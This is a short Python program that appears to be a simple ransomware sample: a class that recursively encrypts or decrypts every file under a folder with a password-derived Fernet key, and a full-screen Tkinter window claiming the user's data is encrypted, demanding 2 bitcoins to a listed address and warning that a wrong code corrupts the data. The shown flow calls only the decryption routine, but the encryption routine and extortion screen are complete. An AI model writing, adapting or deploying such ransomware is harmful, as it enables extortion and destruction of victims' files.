import pwd
from tkinter import *
import os
import subprocess
from cryptography.fernet import Fernet
import base64, hashlib
from codecs import utf_8_decode
from cryptography.fernet import Fernet
import base64, hashlib
import os

class Encryption():
    def __init__(self,password):
        key = hashlib.sha256(password.encode())
        key_64=base64.encodebytes(key.digest())
        self.fernet=Fernet(key_64)


    def encrypt_data(self,data:str) -> bytes:

        cipher = self.fernet.encrypt(data.encode())
        #print(cipher)
        return cipher

    
    def decrypt_data(self,cypher:bytes) -> str:
        decoded = self.fernet.decrypt(cypher)

        return utf_8_decode(decoded)[0]

    def encrypt_folder(self,path:str)->None:
        files= self.get_files_from_folder(path)
        
        for file in files:
            with open(file,"rb") as thefile:
                contents= thefile.read()
    
                contents_enc=self.fernet.encrypt(contents)

            with open(file,"wb") as thefile:
                thefile.write(contents_enc)
    

    def decrypt_folder(self,path:str)->None:
        files= self.get_files_from_folder(path)
        for file in files:
            with open(file,"rb") as thefile:
                contents= thefile.read()
    
                contents_dec=self.fernet.decrypt(contents)

            with open(file,"wb") as thefile:
                thefile.write(contents_dec)

    def get_files_from_folder(self,path):
        files= []
        for file in os.listdir(path):
            if os.path.isfile(path+'/'+file):
                files.append(path+"/"+file)
            else:
                files+=self.get_files_from_folder(path+'/'+file)
        return files


window = Tk()

label = Label(window, text="You data is encrypted! \n If you want your data back , send 2 bitcoins to this address:\n bc1qvpwfav9y0xgt74ukrgru8hfu6hpuk7p8ppps2v")
lbl1=Label(window, text='CODE: ')
t1=Entry(bd=3)    

def mainWin(window):
    
    window.title('Tkalc')
    window.attributes('-fullscreen', True)
 
    label.pack()
    
    lbl1.pack()
    
    t1.pack()

    b1=Button(window, text='Decrypt Data', command=decrypt)
    b1.pack()

    lbl2=Label(window, text='IF YOU PUT THE WRONG CODE THE DATA WILL BE CORRUPTED!')
    lbl2.pack()
    

def decrypt():
    user=pwd.getpwuid(os.getuid())[0]
    password= t1.get()
    enc= Encryption(password)
    enc.decrypt_folder('/files_to_encrypt')
    exit()
    


mainWin(window)

window.mainloop()
